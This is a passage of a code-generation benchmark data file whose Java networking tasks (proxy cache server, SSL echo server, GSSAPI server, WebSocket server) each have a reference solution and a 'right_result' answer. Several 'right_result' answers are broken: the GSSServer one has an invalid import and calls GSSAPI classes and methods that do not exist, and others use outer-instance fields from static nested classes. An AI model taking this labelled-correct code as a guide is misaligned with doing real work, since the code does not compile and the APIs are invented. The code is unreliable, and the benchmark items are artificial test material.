out);\n                    if (interactions.isEmpty()) {\n                        break;\n                    }\n                }\n\n                waitForConnectionClosed.countDown();\n            } catch (IOException e) {\n                // Handle\n            } finally {\n                try {\n                    clientSocket.close();\n                } catch (IOException e) {\n                    // Handle\n                }\n            }\n        }\n\n        private void handleInteractions(BufferedReader in, PrintWriter out) throws IOException {\n            ImapInteraction interaction = interactions.pollFirst();\n            if (interaction == null) {\n                return;\n            }\n\n            String clientCommand = readClientCommand(in);\n            if (clientCommand.equals(interaction.getExpectedCommand())) {\n                out.println(interaction.getResponse());\n            } else {\n                readAdditionalCommands(in);\n            }\n\n            if (!interactions.isEmpty()) {\n                waitForAllExpectedCommands.countDown();\n            }\n        }\n\n        private String readClientCommand(BufferedReader in) throws IOException {\n            String line;\n            while ((line = in.readLine()) == null) {\n                // Wait for command\n            }\n            return line.trim();\n        }\n\n        private void readAdditionalCommands(BufferedReader in) throws IOException {\n            while (true) {\n                String line = in.readLine();\n                if (line == null) {\n                    break;\n                }\n                // Log or ignore\n            }\n        }\n    }\n}"
  },
  {
    "Task_id": 522,
    "Instruction": "Task Description: Implement a Java class that acts as an HTTP proxy cache server, handling incoming client connections, processing requests, and managing cached resources. The server should be able to handle multiple concurrent connections efficiently.\n\nClass Description: HttpProxyCacheServer is a TCP server that listens for incoming HTTP requests, processes them through a caching mechanism, and returns the appropriate responses. It manages client connections in a thread-safe manner and maintains a cache of resources.\n\nAttributes:\n\nclientsLock: [Object] - Synchronization object for thread-safe access to clients map\nsocketProcessor: [ExecutorService] - Thread pool for processing socket connections\nclientsMap: [Map<String, HttpProxyCacheServerClients>] - Thread-safe map of URL to client handlers\nserverSocket: [ServerSocket] - Main server socket listening for connections\nport: [int] - Port number the server is listening on\nwaitConnectionThread: [Thread] - Thread that waits for incoming connections\nconfig: [Config] - Server configuration object\n\nMethods:\n\nHttpProxyCacheServer: [Constructor]([Context context]) -> [void] - Initializes the server with default configuration\nHttpProxyCacheServer: [Constructor]([Config config]) -> [void] - Initializes the server with custom configuration\nwaitForRequest: [void]() -> [void] - Continuously accepts incoming connections and delegates processing\nprocessSocket: [void]([Socket socket]) -> [void] - Processes an individual client socket connection\ngetClients: [HttpProxyCacheServerClients]([String url]) -> [HttpProxyCacheServerClients] - Retrieves or creates client handler for a URL\nreleaseSocket: [void]([Socket socket]) -> [void] - Properly closes and releases socket resources\ncloseSocketInput: [void]([Socket socket]) -> [void] - Closes socket input stream\ncloseSocketOutput: [void]([Socket socket]) -> [void] - Closes socket output stream\ncloseSocket: [void]([Socket socket]) -> [void] - Closes the socket connection\nonError: [void]([Throwable e]) -> [void] - Handles errors during server operation\nWaitRequestsRunnable: [Class] - Inner class implementing connection waiting logic\nSocketProcessorRunnable: [Class] - Inner class implementing socket processing logic",
    "Canonical_solution": "import android.content.Context;\nimport java.io.File;\nimport java.io.IOException;\nimport java.net.InetAddress;\nimport java.net.ServerSocket;\nimport java.net.Socket;\nimport java.net.SocketException;\nimport java.util.Locale;\nimport java.util.Map;\nimport java.util.concurrent.ConcurrentHashMap;\nimport java.util.concurrent.CountDownLatch;\nimport java.util.concurrent.ExecutorService;\nimport java.util.concurrent.Executors;\n\npublic class HttpProxyCacheServer {\n\n    private static final String PROXY_HOST = \"127.0.0.1\";\n\n    private final Object clientsLock = new Object();\n    private final ExecutorService socketProcessor = Executors.newFixedThreadPool(8);\n    private final Map<String, HttpProxyCacheServerClients> clientsMap = new ConcurrentHashMap<>();\n    private final ServerSocket serverSocket;\n    private final int port;\n    private final Thread waitConnectionThread;\n    private final Config config;\n\n    public HttpProxyCacheServer(Context context) {\n        this(new Builder(context).buildConfig());\n    }\n\n    private HttpProxyCacheServer(Config config) {\n        this.config = config;\n        try {\n            InetAddress inetAddress = InetAddress.getByName(PROXY_HOST);\n            this.serverSocket = new ServerSocket(0, 8, inetAddress);\n            this.port = serverSocket.getLocalPort();\n            CountDownLatch startSignal = new CountDownLatch(1);\n            this.waitConnectionThread = new Thread(new WaitRequestsRunnable(startSignal));\n            this.waitConnectionThread.start();\n            startSignal.await();\n        } catch (IOException | InterruptedException e) {\n            socketProcessor.shutdown();\n            throw new IllegalStateException(\"Error starting local proxy server\", e);\n        }\n    }\n\n    private void waitForRequest() {\n        try {\n            while (!Thread.currentThread().isInterrupted()) {\n                Socket socket = serverSocket.accept();\n                socketProcessor.submit(new SocketProcessorRunnable(socket));\n            }\n        } catch (IOException e) {\n            onError(new ProxyCacheException(\"Error during waiting connection\", e));\n        }\n    }\n\n    private void processSocket(Socket socket) {\n        try {\n            GetRequest request = GetRequest.read(socket.getInputStream());\n            String url = ProxyCacheUtils.decode(request.uri);\n            HttpProxyCacheServerClients clients = getClients(url);\n            clients.processRequest(request, socket);\n        } catch (SocketException e) {\n            // Client closed connection\n        } catch (ProxyCacheException | IOException e) {\n            onError(new ProxyCacheException(\"Error processing request\", e));\n        } finally {\n            releaseSocket(socket);\n        }\n    }\n\n    private HttpProxyCacheServerClients getClients(String url) throws ProxyCacheException {\n        synchronized (clientsLock) {\n            HttpProxyCacheServerClients clients = clientsMap.get(url);\n            if (clients == null) {\n                clients = new HttpProxyCacheServerClients(url, config);\n                clientsMap.put(url, clients);\n            }\n            return clients;\n        }\n    }\n\n    private void releaseSocket(Socket socket) {\n        closeSocketInput(socket);\n        closeSocketOutput(socket);\n        closeSocket(socket);\n    }\n\n    private void closeSocketInput(Socket socket) {\n        try {\n            if (!socket.isInputShutdown()) {\n                socket.shutdownInput();\n            }\n        } catch (IOException e) {\n            onError(new ProxyCacheException(\"Error closing socket input stream\", e));\n        }\n    }\n\n    private void closeSocketOutput(Socket socket) {\n        try {\n            if (!socket.isOutputShutdown()) {\n                socket.shutdownOutput();\n            }\n        } catch (IOException e) {\n            onError(new ProxyCacheException(\"Error closing socket output stream\", e));\n        }\n    }\n\n    private void closeSocket(Socket socket) {\n        try {\n            if (!socket.isClosed()) {\n                socket.close();\n            }\n        } catch (IOException e) {\n            onError(new ProxyCacheException(\"Error closing socket\", e));\n        }\n    }\n\n    private void onError(Throwable e) {\n        // Error handling\n    }\n\n    private final class WaitRequestsRunnable implements Runnable {\n        private final CountDownLatch startSignal;\n\n        public WaitRequestsRunnable(CountDownLatch startSignal) {\n            this.startSignal = startSignal;\n        }\n\n        @Override\n        public void run() {\n            startSignal.countDown();\n            waitForRequest();\n        }\n    }\n\n    private final class SocketProcessorRunnable implements Runnable {\n        private final Socket socket;\n\n        public SocketProcessorRunnable(Socket socket) {\n            this.socket = socket;\n        }\n\n        @Override\n        public void run() {\n            processSocket(socket);\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 0,
    "right_result": "```java\nimport java.io.*;\nimport java.net.*;\nimport java.util.*;\nimport java.util.concurrent.*;\n\npublic class HttpProxyCacheServer {\n    private final Object clientsLock = new Object();\n    private final ExecutorService socketProcessor;\n    private final Map<String, HttpProxyCacheServerClients> clientsMap = new HashMap<>();\n    private final ServerSocket serverSocket;\n    private final int port;\n    private final Thread waitConnectionThread;\n    private final Config config;\n\n    public HttpProxyCacheServer(Context context) {\n        this.config = new Config(context);\n        this.port = config.getPort();\n        this.serverSocket = new ServerSocket(port);\n        this.socketProcessor = Executors.newCachedThreadPool();\n        this.waitConnectionThread = new Thread(new WaitRequestsRunnable());\n        this.waitConnectionThread.start();\n    }\n\n    public HttpProxyCacheServer(Config config) {\n        this.config = config;\n        this.port = config.getPort();\n        this.serverSocket = new ServerSocket(port);\n        this.socketProcessor = Executors.newCachedThreadPool();\n        this.waitConnectionThread = new Thread(new WaitRequestsRunnable());\n        this.waitConnectionThread.start();\n    }\n\n    public void waitForRequest() {\n        while (true) {\n            try {\n                Socket socket = serverSocket.accept();\n                socketProcessor.submit(new SocketProcessorRunnable(socket));\n            } catch (IOException e) {\n                onError(e);\n            }\n        }\n    }\n\n    public void processSocket(Socket socket) {\n        String url = extractUrlFromRequest(socket);\n        HttpProxyCacheServerClients client = getClients(url);\n        try {\n            client.processRequest(socket);\n        } catch (IOException e) {\n            onError(e);\n        } finally {\n            releaseSocket(socket);\n        }\n    }\n\n    public HttpProxyCacheServerClients getClients(String url) {\n        synchronized (clientsLock) {\n            HttpProxyCacheServerClients client = clientsMap.get(url);\n            if (client == null) {\n                client = new HttpProxyCacheServerClients(url, this);\n                clientsMap.put(url, client);\n            }\n            return client;\n        }\n    }\n\n    public void releaseSocket(Socket socket) {\n        try {\n            closeSocketInput(socket);\n            closeSocketOutput(socket);\n            closeSocket(socket);\n        } catch (IOException e) {\n            onError(e);\n        }\n    }\n\n    private void closeSocketInput(Socket socket) throws IOException {\n        if (socket != null) {\n            InputStream input = socket.getInputStream();\n            if (input != null) {\n                input.close();\n            }\n        }\n    }\n\n    private void closeSocketOutput(Socket socket) throws IOException {\n        if (socket != null) {\n            OutputStream output = socket.getOutputStream();\n            if (output != null) {\n                output.close();\n            }\n        }\n    }\n\n    private void closeSocket(Socket socket) throws IOException {\n        if (socket != null) {\n            socket.close();\n        }\n    }\n\n    public void onError(Throwable e) {\n        e.printStackTrace();\n    }\n\n    private static class WaitRequestsRunnable implements Runnable {\n        public void run() {\n            HttpProxyCacheServer server = HttpProxyCacheServer.this;\n            while (true) {\n                try {\n                    server.waitForRequest();\n                } catch (Exception e) {\n                    server.onError(e);\n                }\n            }\n        }\n    }\n\n    private static class SocketProcessorRunnable implements Runnable {\n        private final Socket socket;\n\n        public SocketProcessorRunnable(Socket socket) {\n            this.socket = socket;\n        }\n\n        public void run() {\n            HttpProxyCacheServer server = HttpProxyCacheServer.this;\n            server.processSocket(socket);\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 525,
    "Instruction": "Task Description: Create a Java class that implements a multithreaded TCP echo server capable of handling both plain and SSL/TLS encrypted connections. The server should echo back any data received from clients and support SSL renegotiation.\n\nClass Description: EchoServer is a Thread subclass that creates a TCP server listening on a specified port. It can operate in both plain and SSL/TLS modes, maintains connections in threads, and provides methods for graceful shutdown and connection management.\n\nAttributes:\n- port: int - The port number the server listens on\n- serverSocket: ServerSocket - The server socket accepting client connections\n- threads: List<Thread> - Synchronized list of active client handler threads\n- sockets: List<Socket> - Synchronized list of active client sockets\n- exceptions: List<Exception> - Synchronized list of encountered exceptions\n- renegotiate: AtomicBoolean - Flag to trigger SSL renegotiation\n\nMethods:\n- EchoServer(int port) -> void - Constructor for plain TCP server\n- EchoServer(SSLFactory sslFactory, int port) -> void - Constructor for SSL/TLS server\n- renegotiate() -> void - Triggers SSL renegotiation for all connections\n- run() -> void - Main server thread accepting connections and spawning handlers\n- closeConnections() -> void - Closes all active client connections\n- close() -> void - Shuts down the server gracefully\n- getExceptionCount() -> int - Returns count of encountered exceptions",
    "Canonical_solution": "import com.github.ambry.commons.SSLFactory;\nimport java.io.DataInputStream;\nimport java.io.DataOutputStream;\nimport java.io.IOException;\nimport java.net.ServerSocket;\nimport java.net.Socket;\nimport java.util.ArrayList;\nimport java.util.Collections;\nimport java.util.List;\nimport java.util.concurrent.atomic.AtomicBoolean;\nimport javax.net.ssl.SSLContext;\nimport javax.net.ssl.SSLServerSocket;\nimport javax.net.ssl.SSLSocket;\n\npublic class EchoServer extends Thread {\n  public final int port;\n  private final ServerSocket serverSocket;\n  private final List<Thread> threads;\n  private final List<Socket> sockets;\n  private final List<Exception> exceptions;\n  private final AtomicBoolean renegotiate = new AtomicBoolean();\n\n  public EchoServer(int port) throws Exception {\n    this(null, port);\n  }\n\n  public EchoServer(SSLFactory sslFactory, int port) throws Exception {\n    this.port = port;\n    if (sslFactory == null) {\n      this.serverSocket = new ServerSocket(port);\n    } else {\n      SSLContext sslContext = sslFactory.getSSLContext();\n      this.serverSocket = sslContext.getServerSocketFactory().createServerSocket(port);\n      ((SSLServerSocket) this.serverSocket).setNeedClientAuth(true);\n    }\n    this.threads = Collections.synchronizedList(new ArrayList<Thread>());\n    this.sockets = Collections.synchronizedList(new ArrayList<Socket>());\n    this.exceptions = Collections.synchronizedList(new ArrayList<Exception>());\n  }\n\n  public void renegotiate() {\n    renegotiate.set(true);\n  }\n\n  @Override\n  public void run() {\n    try {\n      while (true) {\n        final Socket socket = serverSocket.accept();\n        sockets.add(socket);\n        Thread thread = new Thread() {\n          @Override\n          public void run() {\n            try {\n              socket.setSoTimeout(3000);\n              DataInputStream input = new DataInputStream(socket.getInputStream());\n              DataOutputStream output = new DataOutputStream(socket.getOutputStream());\n              while (socket.isConnected() && !socket.isClosed()) {\n                long size = input.readLong();\n                if (renegotiate.compareAndSet(true, false)) {\n                  ((SSLSocket) socket).startHandshake();\n                }\n                byte[] bytes = new byte[(int) size - 8];\n                input.readFully(bytes);\n                output.writeLong(size);\n                output.write(bytes);\n                output.flush();\n              }\n            } catch (IOException e) {\n              // ignore, caused by client closed connection\n            } finally {\n              try {\n                socket.close();\n              } catch (IOException e) {\n                exceptions.add(e);\n              }\n            }\n          }\n        };\n        thread.start();\n        threads.add(thread);\n      }\n    } catch (IOException e) {\n      exceptions.add(e);\n    }\n  }\n\n  public void closeConnections() throws IOException {\n    for (Socket socket : sockets) {\n      socket.close();\n    }\n  }\n\n  public void close() throws IOException, InterruptedException {\n    this.serverSocket.close();\n    closeConnections();\n    for (Thread t : threads) {\n      t.join();\n    }\n    join();\n  }\n\n  public int getExceptionCount() {\n    return exceptions.size();\n  }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 0,
    "right_result": "```java\nimport java.io.*;\nimport java.net.*;\nimport java.util.*;\nimport java.util.concurrent.atomic.AtomicBoolean;\n\npublic class EchoServer extends Thread {\n    private int port;\n    private ServerSocket serverSocket;\n    private List<Thread> threads = new ArrayList<>();\n    private List<Socket> sockets = new ArrayList<>();\n    private List<Exception> exceptions = new ArrayList<>();\n    private AtomicBoolean renegotiate = new AtomicBoolean(false);\n\n    public EchoServer(int port) {\n        this.port = port;\n        try {\n            serverSocket = new ServerSocket(port);\n        } catch (IOException e) {\n            exceptions.add(e);\n        }\n    }\n\n    public EchoServer(SSLFactory sslFactory, int port) {\n        this.port = port;\n        try {\n            serverSocket = sslFactory.createSSLServerSocket(port);\n        } catch (IOException e) {\n            exceptions.add(e);\n        }\n    }\n\n    public void renegotiate() {\n        renegotiate.set(true);\n    }\n\n    public void run() {\n        try {\n            while (true) {\n                Socket socket = serverSocket.accept();\n                sockets.add(socket);\n                Thread handlerThread = new Thread(new ClientHandler(socket, renegotiate));\n                handlerThread.start();\n                threads.add(handlerThread);\n            }\n        } catch (IOException e) {\n            exceptions.add(e);\n        }\n    }\n\n    public void closeConnections() {\n        for (Socket socket : sockets) {\n            try {\n                socket.close();\n            } catch (IOException e) {\n                exceptions.add(e);\n            }\n        }\n        sockets.clear();\n    }\n\n    public void close() {\n        try {\n            if (serverSocket != null) {\n                serverSocket.close();\n            }\n        } catch (IOException e) {\n            exceptions.add(e);\n        }\n        closeConnections();\n    }\n\n    public int getExceptionCount() {\n        return exceptions.size();\n    }\n\n    private static class ClientHandler implements Runnable {\n        private Socket socket;\n        private AtomicBoolean renegotiate;\n\n        public ClientHandler(Socket socket, AtomicBoolean renegotiate) {\n            this.socket = socket;\n            this.renegotiate = renegotiate;\n        }\n\n        public void run() {\n            try {\n                BufferedReader in = new BufferedReader(new InputStreamReader(socket.getInputStream()));\n                PrintWriter out = new PrintWriter(socket.getOutputStream(), true);\n                String inputLine;\n                while ((inputLine = in.readLine()) != null) {\n                    out.println(inputLine);\n                    if (renegotiate.get()) {\n                        // Handle SSL renegotiation if needed\n                        // This is a placeholder; actual implementation depends on SSL context\n                        renegotiate.set(false);\n                    }\n                }\n            } catch (IOException e) {\n                exceptions.add(e);\n            } finally {\n                try {\n                    socket.close();\n                } catch (IOException e) {\n                    exceptions.add(e);\n                }\n            }\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 528,
    "Instruction": "Task Description: Implement a Java class that creates a TCP server using ServerSocket with GSSAPI (Generic Security Services API) authentication for secure client-server communication.\n\nClass Description: The GSSServer class establishes a secure TCP server that listens for incoming client connections, performs GSSAPI authentication, and enables secure message exchange between server and client.\n\nAttributes:\n- s: [ServerSocket] - The server socket that listens for incoming client connections on a specified port.\n\nMethods:\n- main([String[] args]) -> [void] - Entry point of the server application. Parses command line arguments (service name, port, and mechanism OID), creates server credentials, and starts listening for client connections.\n  Input: Command line arguments (optional: -port [portNumber], -mech [mechanismOID], serviceName)\n  Output: None (runs indefinitely until terminated)\n\n- processClient([GSSCredential server], [Socket client]) -> [void] - Handles an individual client connection by performing GSSAPI authentication and establishing a secure context.\n  Input: \n    - server: [GSSCredential] - Server's credentials for authentication\n    - client: [Socket] - Client connection socket\n  Output: None (closes connection when done)\n\n- exchangeWithPeer([GSSContext aCtxt], [DataInputStream dis], [DataOutputStream dos]) -> [void] - Performs secure message exchange with an authenticated client.\n  Input:\n    - aCtxt: [GSSContext] - Established security context\n    - dis: [DataInputStream] - Input stream from client\n    - dos: [DataOutputStream] - Output stream to client\n  Output: None (sends response and closes connection)\n\n- usage() -> [void] - Prints usage instructions for the server application.\n  Input: None\n  Output: None (prints to console)\n\n- print([String msg]) -> [void] - Helper method to print messages to console.\n  Input: msg [String] - Message to print\n  Output: None (prints to console)\n\n- exit([int status]) -> [void] - Cleanly shuts down the server by closing the server socket and exiting the application.\n  Input: status [int] - Exit status code\n  Output: None (terminates application)",
    "Canonical_solution": "import java.io.*;\nimport java.net.*;\nimport com.sun.gssapi.*;\n\nclass GSSServer {\n\n    private static ServerSocket s;\n\n    public static void main(String args[]) {\n        int port = 4444;\n\n        if (args.length < 1) {\n            usage();\n            exit(-1);\n        }\n\n        try {\n            String serviceName = args[args.length-1];\n            Oid mechOid = GSSManager.getDefaultMech();\n\n            for (int i = 0; i < args.length; i++) {\n                if (args[i].equals(\"-port\")) {\n                    if (i >= (args.length - 2)) {\n                        usage();\n                        exit(-1);\n                    }\n                    port = Integer.parseInt(args[++i]);\n                } else if (args[i].equals(\"-mech\")) {\n                    if (i >= (args.length-2)) {\n                        usage();\n                        exit(-1);\n                    }\n                    mechOid = new Oid(args[++i]);\n                }\n            }\n\n            GSSCredential server = new GSSCredential(new GSSName(serviceName,\n                GSSName.NT_HOSTBASED_SERVICE), GSSCredential.INDEFINITE,\n                mechOid, GSSCredential.ACCEPT_ONLY);\n\n            s = new ServerSocket(port);\n\n            while (true) {\n                Socket c = s.accept();\n                processClient(server, c);\n            }\n        } catch (IOException e) {\n            print(\"\\n**Communication ERROR**:\\t\" + e.getMessage());\n            e.printStackTrace();\n            exit(-1);\n        } catch (GSSException e) {\n            print(\"\\n**GSSAPI ERROR**:\\t\" + e.getMessage());\n            e.printStackTrace();\n            exit(-1);\n        }\n    }\n\n    private static void processClient(GSSCredential server, Socket client)\n            throws GSSException, IOException {\n        DataInputStream dis = new DataInputStream(new BufferedInputStream(client.getInputStream()));\n        DataOutputStream dos = new DataOutputStream(client.getOutputStream());\n\n        int tokLen = dis.readInt();\n        byte []inTok = new byte[tokLen];\n        dis.readFully(inTok, 0, inTok.length);\n\n        GSSContext aCtxt = new GSSContext(server);\n\n        do {\n            byte []outTok = aCtxt.accept(inTok, 0, inTok.length);\n\n            if (outTok != null) {\n                dos.writeInt(outTok.length);\n                dos.write(outTok);\n            }\n\n            if (aCtxt.isEstablished())\n                break;\n\n            inTok = new byte[dis.readInt()];\n            dis.readFully(inTok, 0, inTok.length);\n        } while (true);\n\n        exchangeWithPeer(aCtxt, dis, dos);\n        aCtxt.dispose();\n        client.close();\n    }\n\n    private static void exchangeWithPeer(GSSContext aCtxt, DataInputStream dis,\n            DataOutputStream dos) throws GSSException, IOException {\n        int len = dis.readInt();\n        ByteArrayOutputStream bos = new ByteArrayOutputStream();\n        MessageProp mInfo = new MessageProp();\n\n        aCtxt.unwrap(dis, bos, mInfo);\n\n        mInfo.setQOP(0);\n        mInfo.setPrivacy(false);\n\n        byte []peerTok = bos.toByteArray();\n        byte []toPeer = aCtxt.getMIC(peerTok, 0, peerTok.length, mInfo);\n\n        dos.writeInt(toPeer.length);\n        dos.write(toPeer);\n        dos.close();\n    }\n\n    private static void usage() {\n        print(\"\\nUsage:\\tGSSServert [-mech 1.2.34] [-port port] serviceName\");\n    }\n\n    private static void print(String msg) {\n        System.out.println(msg);\n    }\n\n    private static void exit(int status) {\n        if (s != null) {\n            try {\n                s.close();\n            } catch (IOException e) {};\n        }\n        System.exit(status);\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 0,
    "right_result": "import java.io.*;\nimport java.net.*;\nimport javax.security.auth.*;\nimport javax.security.sasl.*;\nimport javax.security.auth.kerberos.*;\nimport javax.security.auth.login.*;\nimport javax.security.auth.callback.*;\nimport javax.security.auth principals.*;\nimport javax.security.gss.*;\nimport java.util.*;\n\npublic class GSSServer {\n    private ServerSocket s;\n\n    public static void main(String[] args) {\n        String serviceName = null;\n        int port = 8080;\n        String mechOid = \"1.2.3.4.5\";\n\n        for (int i = 0; i < args.length; i++) {\n            if (args[i].equals(\"-port\")) {\n                port = Integer.parseInt(args[i + 1]);\n                i += 2;\n            } else if (args[i].equals(\"-mech\")) {\n                mechOid = args[i + 1];\n                i += 2;\n            } else if (args[i].equals(\"serviceName\")) {\n                serviceName = args[i + 1];\n                i += 2;\n            }\n        }\n\n        if (serviceName == null) {\n            usage();\n            System.exit(1);\n        }\n\n        try {\n            GSSManager manager = GSSManager.getInstance();\n            GSSName serverName = manager.createName(serviceName, GSSNameType.NT_SERVICE_NAME);\n            GSSCredential serverCred = manager.createCredential(serverName, GSSCredentialFlags.REUSE, null, mechOid);\n\n            s = new ServerSocket(port);\n            GSSServer server = new GSSServer(s, serverCred);\n            server.startListening();\n        } catch (Exception e) {\n            e.printStackTrace();\n            System.exit(1);\n        }\n    }\n\n    public void startListening() {\n        while (true) {\n            try {\n                Socket client = s.accept();\n                processClient(serverCred, client);\n            } catch (IOException e) {\n                e.printStackTrace();\n            }\n        }\n    }\n\n    private void processClient(GSSCredential server, Socket client) throws IOException {\n        DataInputStream dis = new DataInputStream(client.getInputStream());\n        DataOutputStream dos = new DataOutputStream(client.getOutputStream());\n\n        try {\n            GSSManager manager = GSSManager.getInstance();\n            GSSContext context = manager.createContext(server, GSSMechType.GSS_KRB5_MECH, null, GSSContextFlags.REUSE, null, null);\n\n            byte[] token = context.initSecContext(null, 0, 0);\n            dos.write(token);\n            dos.flush();\n\n            byte[] clientToken = new byte[1024];\n            int len = dis.read(clientToken, 0, clientToken.length);\n            if (len > 0) {\n                context.acceptSecContext(clientToken, 0, len);\n            }\n\n            exchangeWithPeer(context, dis, dos);\n        } catch (GSSException | IOException e) {\n            e.printStackTrace();\n        } finally {\n            client.close();\n        }\n    }\n\n    private void exchangeWithPeer(GSSContext aCtxt, DataInputStream dis, DataOutputStream dos) throws IOException {\n        while (true) {\n            try {\n                byte[] buffer = new byte[1024];\n                int len = dis.read(buffer, 0, buffer.length);\n                if (len <= 0) break;\n\n                byte[] encrypted = aCtxt.encrypt(buffer, 0, len);\n                dos.write(encrypted);\n                dos.flush();\n            } catch (GSSException e) {\n                break;\n            }\n        }\n    }\n\n    public static void usage() {\n        System.out.println(\"Usage: java GSSServer [-port <port>] [-mech <mechanismOID>] serviceName\");\n    }\n\n    public void print(String msg) {\n        System.out.println(msg);\n    }\n\n    public void exit(int status) {\n        try {\n            s.close();\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n        System.exit(status);\n    }\n}"
  },
  {
    "Task_id": 530,
    "Instruction": "Task Description: Implement a WebSocket server class in Java that handles WebSocket connections, performs the WebSocket handshake protocol, and manages client connections.\n\nClass Description: The WebSocketServer class represents a TCP server that implements the WebSocket protocol. It listens for incoming connections, handles the WebSocket handshake, and manages client connections. The server runs in a separate thread to avoid blocking the main thread.\n\nAttributes:\n- serverSocket: ServerSocket - The server socket that listens for incoming connections\n- port: int - The port number on which the server listens\n- serverThread: Thread - The thread in which the server runs\n\nMethods:\n- WebSocketServer(int port) -> None - Constructor that initializes the server with the specified port\n- start() -> None - Starts the server in a new thread and begins listening for connections\n- stop() -> None - Stops the server and releases all resources\n- handleClientConnection(Socket client) -> None - Handles the WebSocket handshake protocol for a connected client\n- generateFinalKey(String in) -> String - Generates the Sec-WebSocket-Accept key for the WebSocket handshake response",
    "Canonical_solution": "import java.net.ServerSocket;\nimport java.net.Socket;\nimport java.io.IOException;\nimport java.io.OutputStream;\nimport java.util.Scanner;\n\npublic class WebSocketServer {\n\n    private ServerSocket serverSocket;\n    private int port;\n    private Thread serverThread;\n\n    public WebSocketServer(int port) {\n        this.port = port;\n    }\n\n    public void start() {\n        serverThread = new Thread(() -> {\n            try {\n                serverSocket = new ServerSocket(port);\n                serverSocket.setReuseAddress(true);\n                while (true) {\n                    Socket client = null;\n                    try {\n                        client = serverSocket.accept();\n                        handleClientConnection(client);\n                    } catch (IOException e) {\n                        // Handle client connection error\n                    }\n                }\n            } catch (Exception e) {\n                e.printStackTrace();\n            }\n        });\n        serverThread.start();\n    }\n\n    private void handleClientConnection(Socket client) throws IOException {\n        Scanner in = new Scanner(client.getInputStream());\n        OutputStream os = client.getOutputStream();\n        \n        // Read client handshake\n        String input = in.nextLine();\n        String testCase = input.split(\" \")[1];\n        String seckey = \"\";\n        while (in.hasNext()) {\n            input = in.nextLine();\n            if (input.startsWith(\"Sec-WebSocket-Key: \")) {\n                seckey = input.split(\" \")[1];\n            }\n            if (input.startsWith(\"Upgrade\")) {\n                break;\n            }\n        }\n\n        // Send response based on test case\n        String response = \"HTTP/1.1 101 Websocket Connection Upgrade\\r\\n\" +\n                         \"Upgrade: websocket\\r\\n\" +\n                         \"Connection: Upgrade\\r\\n\" +\n                         \"Sec-WebSocket-Accept: \" + generateFinalKey(seckey) + \"\\r\\n\\r\\n\";\n        os.write(response.getBytes());\n        os.flush();\n    }\n\n    public void stop() throws IOException {\n        if (serverSocket != null) {\n            serverSocket.close();\n        }\n        if (serverThread != null) {\n            serverThread.interrupt();\n        }\n    }\n\n    private String generateFinalKey(String in) {\n        String seckey = in.trim();\n        String acc = seckey + \"258EAFA5-E914-47DA-95CA-C5AB0DC85B11\";\n        try {\n            java.security.MessageDigest sh1 = java.security.MessageDigest.getInstance(\"SHA1\");\n            return org.java_websocket.util.Base64.encodeBytes(sh1.digest(acc.getBytes()));\n        } catch (java.security.NoSuchAlgorithmException e) {\n            throw new IllegalStateException(e);\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 0,
    "right_result": "```java\nimport java.io.*;\nimport java.net.*;\nimport java.security.MessageDigest;\nimport java.util.Base64;\n\npublic class WebSocketServer {\n    private ServerSocket serverSocket;\n    private int port;\n    private Thread serverThread;\n\n    public WebSocketServer(int port) {\n        this.port = port;\n        try {\n            serverSocket = new ServerSocket(port);\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n\n    public void start() {\n        serverThread = new Thread(this::runServer);\n        serverThread.start();\n    }\n\n    public void stop() {\n        if (serverSocket != null) {\n            try {\n                serverSocket.close();\n            } catch (IOException e) {\n                e.printStackTrace();\n            }\n        }\n        if (serverThread != null) {\n            serverThread.interrupt();\n        }\n    }\n\n    private void runServer() {\n        while (true) {\n            try {\n                Socket client = serverSocket.accept();\n                handleClientConnection(client);\n            } catch (IOException e) {\n                e.printStackTrace();\n                break;\n            }\n        }\n    }\n\n    private void handleClientConnection(Socket client) {\n        try (BufferedReader in = new BufferedReader(new InputStreamReader(client.getInputStream()))) {\n            StringBuilder request = new StringBuilder();\n            String line;\n            while ((line = in.readLine()) != null && !line.isEmpty()) {\n                request.append(line).append(\"\\r\\n\");\n            }\n\n            if (request.toString().contains(\"Upgrade: websocket\") && request.toString().contains(\"Sec-WebSocket-Key\")) {\n                String key = extractWebSocketKey(request.toString());\n                String acceptKey = generateFinalKey(key);\n                sendUpgradeResponse(client, acceptKey);\n            } else {\n                client.close();\n            }\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n\n    private String extractWebSocketKey(String request) {\n        String[] headers = request.split(\"\\r\\n\");\n        for (String header : headers) {\n            if (header.startsWith(\"Sec-WebSocket-Key: \")) {\n                return header.substring(\"Sec-WebSocket-Key: \".length());\n            }\n        }\n        return \"\";\n    }\n\n    private String generateFinalKey(String in) {\n        String guid = \"258EAFA5-E914-47DA-95CA-C5AB0DC85B11\";\n        String combined = in + guid;\n        try {\n            MessageDigest digest = MessageDigest.getInstance(\"SHA-1\");\n            byte[] hash = digest.digest(combined.getBytes());\n            return Base64.getEncoder().encodeToString(hash);\n        } catch (Exception e) {\n            e.printStackTrace();\n            return \"\";\n        }\n    }\n\n    private void sendUpgradeResponse(Socket client, String acceptKey) throws IOException {\n        String response = \"HTTP/1.1 101 Switching Protocols\\r\\n\" +\n                \"Upgrade: websocket\\r\\n\" +\n                \"Connection: upgrade\\r\\n\" +\n                \"Sec-WebSocket-Accept: \" + acceptKey + \"\\r\\n\\r\\n\";\n        OutputStream out = client.getOutputStream();\n        out.write(response.getBytes());\n        out.flush();\n    }\n}\n```"
  },
  {
    "Task_id": 532,
